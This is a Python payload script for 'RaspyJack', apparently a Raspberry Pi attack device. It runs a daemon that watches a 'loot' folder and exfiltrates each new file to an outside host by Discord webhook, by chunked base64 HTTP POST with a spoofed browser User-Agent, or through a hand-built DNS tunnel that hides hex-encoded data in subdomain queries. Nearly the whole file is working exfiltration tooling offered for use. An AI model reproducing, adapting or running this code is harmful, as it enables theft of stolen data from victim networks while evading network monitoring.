#!/usr/bin/env python3
"""
RaspyJack Payload -- Auto Loot Exfiltration Daemon
====================================================
Author: 7h30th3r0n3

Watches /root/Raspyjack/loot/ for new files using os.scandir polling
(every 10s). When a new file is detected, exfiltrate via the configured
channel: Discord webhook, HTTP POST, or DNS tunnel.

Keeps a .exfiltrated manifest to avoid re-sending files.

Setup / Prerequisites:
  - Configure channel:
    Discord: set webhook URL in /root/Raspyjack/discord_webhook.txt.
    HTTP: set target URL in config.
    DNS: requires an authoritative DNS domain you control.

Controls:
  OK         -- Start / stop daemon
  KEY1       -- Cycle exfiltration channel (Discord / HTTP / DNS)
  UP / DOWN  -- Scroll exfiltration log
  KEY2       -- Force re-exfiltrate all files
  KEY3       -- Exit
"""

import os
import sys
import time
import json
import base64
import hashlib
import threading
import struct
import socket
import math
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_ROOT = "/root/Raspyjack/loot"
EXFIL_DIR = os.path.join(LOOT_ROOT, "AutoExfil")
MANIFEST_PATH = os.path.join(EXFIL_DIR, ".exfiltrated")
CONFIG_DIR = "/root/Raspyjack/config/auto_loot_exfil"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
WEBHOOK_PATH = "/root/Raspyjack/discord_webhook.txt"
POLL_INTERVAL = 10  # seconds
DEBOUNCE = 0.25

CHANNELS = ["discord", "http", "dns"]
CHANNEL_LABELS = ["Discord", "HTTP", "DNS"]

os.makedirs(EXFIL_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)

DEFAULT_CONFIG = {
    "http_url": "https://your-server.com/exfil",
    "dns_domain": "exfil.your-domain.com",
    "dns_server": "8.8.8.8",
    "chunk_size": 4096,
}

# ---------------------------------------------------------------------------
# Thread-safe state
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "config": dict(DEFAULT_CONFIG),
    "channel_idx": 0,
    "daemon_running": False,
    "daemon_stop": False,
    "exfil_count": 0,
    "last_file": "",
    "log_lines": [],
    "log_scroll": 0,
    "status": "Stopped",
    "last_message": "",
    "manifest": set(),
}


def _get_state():
    with _lock:
        return {
            "config": dict(_state["config"]),
            "channel_idx": _state["channel_idx"],
            "daemon_running": _state["daemon_running"],
            "daemon_stop": _state["daemon_stop"],
            "exfil_count": _state["exfil_count"],
            "last_file": _state["last_file"],
            "log_lines": list(_state["log_lines"]),
            "log_scroll": _state["log_scroll"],
            "status": _state["status"],
            "last_message": _state["last_message"],
        }


def _set_state(**kwargs):
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


def _add_log(message):
    """Add a timestamped log entry."""
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {message}"
    with _lock:
        _state["log_lines"] = list(_state["log_lines"]) + [entry]
        # Keep last 50 entries
        if len(_state["log_lines"]) > 50:
            _state["log_lines"] = _state["log_lines"][-50:]


def _get_manifest():
    with _lock:
        return set(_state["manifest"])


def _add_to_manifest(file_hash):
    with _lock:
        _state["manifest"] = set(_state["manifest"]) | {file_hash}


def _clear_manifest():
    with _lock:
        _state["manifest"] = set()


# ---------------------------------------------------------------------------
# Config / manifest persistence
# ---------------------------------------------------------------------------
def _load_config():
    """Load config and manifest from disk."""
    # Config
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                loaded = json.load(f)
            merged = {**DEFAULT_CONFIG, **loaded}
            _set_state(config=merged)
        except (json.JSONDecodeError, PermissionError):
            _set_state(config=dict(DEFAULT_CONFIG))
    else:
        _set_state(config=dict(DEFAULT_CONFIG))
        _save_config()

    # Manifest
    if os.path.isfile(MANIFEST_PATH):
        try:
            with open(MANIFEST_PATH, "r") as f:
                hashes = set(line.strip() for line in f if line.strip())
            with _lock:
                _state["manifest"] = hashes
        except (PermissionError, OSError):
            pass


def _save_config():
    """Persist config to disk."""
    st = _get_state()
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(st["config"], f, indent=2)
    except Exception:
        pass


def _save_manifest():
    """Persist manifest to disk."""
    manifest = _get_manifest()
    try:
        with open(MANIFEST_PATH, "w") as f:
            for h in sorted(manifest):
                f.write(h + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# File hashing (for dedup in manifest)
# ---------------------------------------------------------------------------
def _file_hash(filepath):
    """Compute SHA-256 hash of file for deduplication."""
    h = hashlib.sha256()
    try:
        with open(filepath, "rb") as f:
            while True:
                block = f.read(8192)
                if not block:
                    break
                h.update(block)
        return h.hexdigest()
    except Exception:
        return None


# ---------------------------------------------------------------------------
# File scanning
# ---------------------------------------------------------------------------
def _scan_new_files():
    """
    Scan loot directory for files not yet in the manifest.
    Returns list of (filepath, rel_path, file_hash).
    """
    manifest = _get_manifest()
    new_files = []

    if not os.path.isdir(LOOT_ROOT):
        return new_files

    for dirpath, _dirnames, filenames in os.walk(LOOT_ROOT):
        # Skip our own directory
        if "AutoExfil" in dirpath:
            continue
        for fname in filenames:
            fpath = os.path.join(dirpath, fname)
            if not os.path.isfile(fpath):
                continue
            fhash = _file_hash(fpath)
            if fhash and fhash not in manifest:
                rel_path = os.path.relpath(fpath, LOOT_ROOT)
                new_files.append((fpath, rel_path, fhash))

    return new_files


# ---------------------------------------------------------------------------
# Exfiltration channels
# ---------------------------------------------------------------------------

# -- Discord --
def _exfil_discord(filepath, rel_path):
    """Exfiltrate file via Discord webhook."""
    try:
        import requests
    except ImportError:
        _add_log("ERR: requests not installed")
        return False

    webhook_url = _read_webhook_url()
    if not webhook_url:
        _add_log("ERR: No Discord webhook")
        return False

    file_size = os.path.getsize(filepath)
    # Discord limit: 8MB for free accounts
    if file_size > 8 * 1024 * 1024:
        _add_log(f"SKIP: {rel_path} too large for Discord")
        return False

    try:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            payload = {"content": f"AutoExfil: {rel_path}"}
            resp = requests.post(
                webhook_url, data=payload, files=files, timeout=60,
            )
        if resp.status_code in (200, 204):
            return True
        _add_log(f"Discord HTTP {resp.status_code}")
        return False
    except Exception as exc:
        _add_log(f"Discord err: {str(exc)[:20]}")
        return False


def _read_webhook_url():
    """Read Discord webhook URL."""
    try:
        with open(WEBHOOK_PATH, "r") as f:
            url = f.read().strip()
        if url and url.startswith("https://"):
            return url
    except (FileNotFoundError, PermissionError):
        pass
    return None


# -- HTTP POST --
def _exfil_http(filepath, rel_path):
    """Exfiltrate file via HTTP POST (base64 chunked)."""
    try:
        import requests
    except ImportError:
        _add_log("ERR: requests not installed")
        return False

    st = _get_state()
    cfg = st["config"]
    target_url = cfg["http_url"]
    chunk_size = cfg.get("chunk_size", 4096)

    try:
        with open(filepath, "rb") as f:
            raw_data = f.read()
    except Exception as exc:
        _add_log(f"Read err: {str(exc)[:20]}")
        return False

    encoded = base64.b64encode(raw_data).decode("ascii")
    total_chunks = max(1, math.ceil(len(encoded) / chunk_size))

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    })

    for i in range(total_chunks):
        if _get_state()["daemon_stop"]:
            session.close()
            return False

        start = i * chunk_size
        end = min(start + chunk_size, len(encoded))
        chunk_data = encoded[start:end]

        payload = {
            "chunk": i + 1,
            "total": total_chunks,
            "filename": rel_path,
            "data": chunk_data,
        }

        try:
            resp = session.post(target_url, json=payload, timeout=30)
            if resp.status_code not in (200, 201, 204):
                _add_log(f"HTTP {resp.status_code} chunk {i + 1}")
                session.close()
                return False
        except Exception as exc:
            _add_log(f"HTTP err: {str(exc)[:20]}")
            session.close()
            return False

    session.close()
    return True


# -- DNS Tunnel --
def _exfil_dns(filepath, rel_path):
    """
    Exfiltrate file by encoding data in DNS queries.
    Each label can carry up to 63 bytes, total query up to 253 bytes.
    Data is hex-encoded in subdomain labels.
    Format: <seq>.<hex_chunk>.<domain>
    """
    st = _get_state()
    cfg = st["config"]
    domain = cfg["dns_domain"]
    dns_server = cfg.get("dns_server", "8.8.8.8")

    try:
        with open(filepath, "rb") as f:
            raw_data = f.read()
    except Exception as exc:
        _add_log(f"Read err: {str(exc)[:20]}")
        return False

    # Each DNS label max 63 chars, use 60 for safety
    # Hex encoding doubles size, so 30 bytes of data per label
    # Use 2 labels per query: seq label + data label
    bytes_per_query = 30
    total_chunks = max(1, math.ceil(len(raw_data) / bytes_per_query))

    for i in range(total_chunks):
        if _get_state()["daemon_stop"]:
            return False

        start = i * bytes_per_query
        end = min(start + bytes_per_query, len(raw_data))
        chunk = raw_data[start:end]
        hex_chunk = chunk.hex()

        # Build DNS query: <seq_hex>.<hex_data>.<domain>
        seq_hex = f"{i:04x}"
        query_name = f"{seq_hex}.{hex_chunk}.{domain}"

        # Ensure total length is within DNS limits
        if len(query_name) > 253:
            # Split hex_chunk across multiple labels
            labels = [hex_chunk[j:j + 60] for j in range(0, len(hex_chunk), 60)]
            query_name = f"{seq_hex}." + ".".join(labels) + f".{domain}"

        try:
            _dns_query(query_name, dns_server)
        except Exception:
            # DNS failures are expected; the data is in the query itself
            pass

        # Small delay to avoid flooding
        time.sleep(0.05)

    # Send completion marker
    try:
        completion = f"ffff.{total_chunks:04x}.done.{domain}"
        _dns_query(completion, dns_server)
    except Exception:
        pass

    return True


def _dns_query(name, server, timeout=2):
    """Send a simple DNS A query via UDP."""
    # Build a minimal DNS query packet
    transaction_id = os.urandom(2)
    flags = b'\x01\x00'  # Standard query, recursion desired
    questions = b'\x00\x01'
    answers = b'\x00\x00'
    authority = b'\x00\x00'
    additional = b'\x00\x00'

    header = transaction_id + flags + questions + answers + authority + additional

    # Encode the query name
    qname = b""
    for label in name.split("."):
        if len(label) > 63:
            label = label[:63]
        qname += bytes([len(label)]) + label.encode("ascii")
    qname += b'\x00'

    qtype = b'\x00\x01'   # A record
    qclass = b'\x00\x01'  # IN class

    packet = header + qname + qtype + qclass

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(packet, (server, 53))
        sock.recv(512)  # We don't care about the response
    except socket.timeout:
        pass  # Expected - the query itself carries our data
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Exfiltration dispatch
# ---------------------------------------------------------------------------
def _exfil_file(filepath, rel_path, channel):
    """Dispatch exfiltration to the appropriate channel."""
    if channel == "discord":
        return _exfil_discord(filepath, rel_path)
    elif channel == "http":
        return _exfil_http(filepath, rel_path)
    elif channel == "dns":
        return _exfil_dns(filepath, rel_path)
    return False


# ---------------------------------------------------------------------------
# Daemon loop
# ---------------------------------------------------------------------------
def _daemon_loop():
    """Main daemon loop: poll for new files and exfiltrate."""
    _set_state(
        daemon_running=True,
        daemon_stop=False,
        status="Running",
    )
    _add_log("Daemon started")

    while not _get_state()["daemon_stop"]:
        new_files = _scan_new_files()

        if new_files:
            st = _get_state()
            channel = CHANNELS[st["channel_idx"]]
            _add_log(f"Found {len(new_files)} new file(s)")

            for filepath, rel_path, fhash in new_files:
                if _get_state()["daemon_stop"]:
                    break

                _set_state(
                    last_file=os.path.basename(filepath),
                    status=f"Exfil: {channel}",
                    last_message=f"Sending {rel_path[:15]}",
                )
                _add_log(f"TX: {rel_path[:25]}")

                success = _exfil_file(filepath, rel_path, channel)

                if success:
                    _add_to_manifest(fhash)
                    _save_manifest()
                    count = _get_state()["exfil_count"] + 1
                    _set_state(exfil_count=count)
                    _add_log(f"OK: {rel_path[:25]}")
                else:
                    _add_log(f"FAIL: {rel_path[:23]}")

        # Update status
        if not _get_state()["daemon_stop"]:
            _set_state(
                status="Watching",
                last_message=f"Poll in {POLL_INTERVAL}s",
            )

        # Sleep in small increments so we can respond to stop quickly
        for _ in range(POLL_INTERVAL * 10):
            if _get_state()["daemon_stop"]:
                break
            time.sleep(0.1)

    _set_state(
        daemon_running=False,
        status="Stopped",
        last_message="Daemon stopped",
    )
    _add_log("Daemon stopped")


def _start_daemon():
    """Start the daemon in a background thread."""
    if _get_state()["daemon_running"]:
        return
    thread = threading.Thread(target=_daemon_loop, daemon=True)
    thread.start()


def _stop_daemon():
    """Signal the daemon to stop."""
    _set_state(daemon_stop=True, last_message="Stopping...")


def _force_reexfil():
    """Clear manifest and force re-exfiltration of all files."""
    _clear_manifest()
    _save_manifest()
    _set_state(
        exfil_count=0,
        last_message="Manifest cleared",
    )
    _add_log("Manifest cleared - will re-exfil all")


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
def _draw_lcd():
    """Render current state on LCD."""
    st = _get_state()
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "AUTO EXFIL", font=font, fill="#FF4400")
    running = st["daemon_running"]
    status_color = "#00FF00" if running else "#FF4444"
    d.ellipse((105, 3, 113, 11), fill=status_color)

    # Channel display
    channel_label = CHANNEL_LABELS[st["channel_idx"]]
    d.text((2, 16), f"Channel: {channel_label}", font=font, fill="#00AAFF")

    # Stats
    d.text((2, 28), f"Status: {st['status'][:13]}", font=font, fill="#AAAAAA")
    d.text((2, 40), f"Exfiltrated: {st['exfil_count']}", font=font, fill="#888")

    if st["last_file"]:
        d.text((2, 52), f"Last: {st['last_file'][:16]}", font=font, fill="#888")

    # Log display
    log_lines = st["log_lines"]
    log_scroll = st["log_scroll"]
    log_y_start = 66
    max_visible = 3

    if log_lines:
        d.rectangle((0, log_y_start - 2, 127, log_y_start - 1), fill="#333")
        visible_start = max(0, len(log_lines) - max_visible - log_scroll)
        visible_end = visible_start + max_visible

        for i, line_idx in enumerate(range(visible_start, min(visible_end, len(log_lines)))):
            y = log_y_start + i * 11
            line = log_lines[line_idx]
            # Color based on content
            fg = "#888"
            if "ERR" in line or "FAIL" in line:
                fg = "#FF4444"
            elif "OK:" in line:
                fg = "#00AA44"
            elif "TX:" in line:
                fg = "#FFAA00"
            d.text((2, y), line[:21], font=font, fill=fg)

    # Message
    d.rectangle((0, 106, 127, 115), fill="#0A0A0A")
    d.text((2, 106), st["last_message"][:21], font=font, fill="#FFCC00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    action = "STOP" if running else "START"
    d.text((2, 117), f"OK:{action} K1:Ch K3:Quit", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _load_config()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "AUTO LOOT EXFIL", font=font, fill="#FF4400")
    d.text((4, 32), "File watch daemon", font=font, fill="#888")
    d.text((4, 52), "OK=Start/Stop", font=font, fill="#666")
    d.text((4, 64), "K1=Channel  U/D=Log", font=font, fill="#666")
    d.text((4, 76), "K2=Re-exfil all", font=font, fill="#666")
    d.text((4, 88), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            _draw_lcd()
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                _stop_daemon()
                break

            elif btn == "OK":
                st = _get_state()
                if st["daemon_running"]:
                    _stop_daemon()
                else:
                    _start_daemon()
                time.sleep(DEBOUNCE)

            elif btn == "KEY1":
                st = _get_state()
                new_idx = (st["channel_idx"] + 1) % len(CHANNELS)
                _set_state(channel_idx=new_idx)
                label = CHANNEL_LABELS[new_idx]
                _set_state(last_message=f"Channel: {label}")
                _add_log(f"Channel -> {label}")
                time.sleep(DEBOUNCE)

            elif btn == "UP":
                st = _get_state()
                max_scroll = max(0, len(st["log_lines"]) - 3)
                new_scroll = min(max_scroll, st["log_scroll"] + 1)
                _set_state(log_scroll=new_scroll)
                time.sleep(DEBOUNCE)

            elif btn == "DOWN":
                st = _get_state()
                new_scroll = max(0, st["log_scroll"] - 1)
                _set_state(log_scroll=new_scroll)
                time.sleep(DEBOUNCE)

            elif btn == "KEY2":
                _force_reexfil()
                time.sleep(DEBOUNCE)

            elif btn == "LEFT" or btn == "RIGHT":
                time.sleep(DEBOUNCE)

            time.sleep(0.05)

    finally:
        _stop_daemon()
        # Wait briefly for daemon to stop
        for _ in range(20):
            if not _get_state()["daemon_running"]:
                break
            time.sleep(0.1)
        _save_manifest()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
